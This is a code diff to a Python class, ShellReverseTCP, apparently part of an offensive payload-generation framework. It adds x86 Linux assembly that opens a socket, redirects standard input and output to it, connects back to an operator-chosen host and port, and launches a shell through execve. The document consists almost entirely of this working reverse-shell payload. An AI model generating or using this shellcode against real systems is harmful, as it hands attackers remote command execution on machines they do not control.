@@ -40,12 +40,55 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
         else:
             shell = self.shell['sh']
 
-        shell = shell[::-1]
+        shell = [shell[::-1][i:i+4] for i in range(0, len(shell), 4)]
+        shell_asm = ""
+
+        for line in shell:
+            shell_asm += f"push 0x{line.hex()}\n"
+
         rhost = self.convert_host(options['RHOST'])
         rport = self.convert_port(options['RPORT'])
 
         shellcode = f"""
-        
+        start:
+            xor ebx, ebx
+            mul ebx
+            push ebx
+            inc ebx
+            push ebx
+            push byte +0x2
+            mov ecx, esp
+            mov al, 0x66
+            int 0x80
+
+            xchg eax, ebx
+            pop ecx
+
+        dup:
+            mov al, 0x3f
+            int 0x80
+
+            dec ecx
+            jns dup
+            push 0x{rhost.hex()}
+            push 0x{rport.hex()}0002
+            mov ecx, esp
+            mov al, 0x66
+            push eax
+            push ecx
+            push ebx
+            mov bl, 0x3
+            mov ecx, esp
+            int 0x80
+
+            push edx
+            {shell_asm}
+            mov ebx, esp
+            push edx
+            push ebx
+            mov ecx, esp
+            mov al, 0xb
+            int 0x80
         """
 
         if assemble:
